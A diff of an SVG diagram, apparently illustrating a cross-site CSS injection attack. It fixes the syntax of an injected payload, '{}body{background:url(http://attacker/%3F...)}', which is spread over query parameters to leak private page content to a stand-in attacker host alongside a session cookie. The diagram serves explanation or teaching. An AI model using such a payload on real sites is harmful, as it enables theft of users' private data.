@@ -66,7 +66,7 @@
 	  ><tspan x="726.24988" y="816.36218">Set-Cookie: SID=2DK3P9YOX5</tspan
 	  ><tspan x="726.24988" y="831.36218">...</tspan></text>
     <text style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier;"
-	  ><tspan x="720.19324" y="915.14154">GET /privatepage?q1=<tspan font-weight="bold">{}body:background:</tspan></tspan
+	  ><tspan x="720.19324" y="915.14154">GET /privatepage?q1=<tspan font-weight="bold">{}body{background:</tspan></tspan
 	  ><tspan x="720.19324" y="930.81274"><tspan font-weight="bold">url(http://attacker/%3F</tspan>&amp;q2=<tspan font-weight="bold">)}</tspan></tspan
 	  ><tspan x="720.19324" y="945.85913">Cookie: SID=2DK3P9YOX5</tspan></text>
     <text style="font-size:12px;text-align:center;text-anchor:middle;font-family:Courier;"
